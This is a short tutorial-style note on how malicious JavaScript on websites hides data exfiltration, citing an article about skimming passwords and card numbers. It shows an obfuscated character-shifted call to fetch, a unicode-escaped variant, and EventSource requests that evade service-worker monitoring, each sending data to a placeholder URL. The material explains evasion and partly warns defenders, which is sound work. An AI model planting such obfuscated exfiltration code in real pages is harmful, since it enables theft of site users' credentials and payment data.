Sources:
1) https://hackernoon.com/im-harvesting-credit-card-numbers-and-passwords-from-your-site-here-s-how-9a8cb347c5b5

### Hiding malicious Javascript code
Sometimes, Javascript may be hidden by using a huge variety of methods to simply allow Javascript to evaluate jumbled up strings to function names etc.

For example, running `fetch` and sending passwords in URL parameters can easily raise suspicions. Any mention of things like `fetch` or `XMLHttpRequest` might become investigated.

Some examples taken from source 1 for hiding `fetch` are:
```javascript {cmd="node"}
const i = 'gfudi';
const k = s => s.split('').map(c => String.fromCharCode(c.charCodeAt() - 1)).join('');
self[k(i)](urlWithYourPreciousData);
```
`gfudi` is just the word `fetch` with each character shifted up by a value of 1. A very simple way to hide your true intentions.

`self` is also an alias for `window` and as such, `self['\u0066\u0065\u0074\u0063\u0068'](...)` will also call `fetch`.

Obfuscating code is an infinite topic and simply "noticing" something like this shouldn't be relied on as the code could be obfuscated in a million different ways.

#### Hiding fetch requests
`new EventSource(urlWithYourPreciousData)` can simply be called where possible to avoid a serviceWorker listening for `fetch` requests. Our request will get by unnoticed.
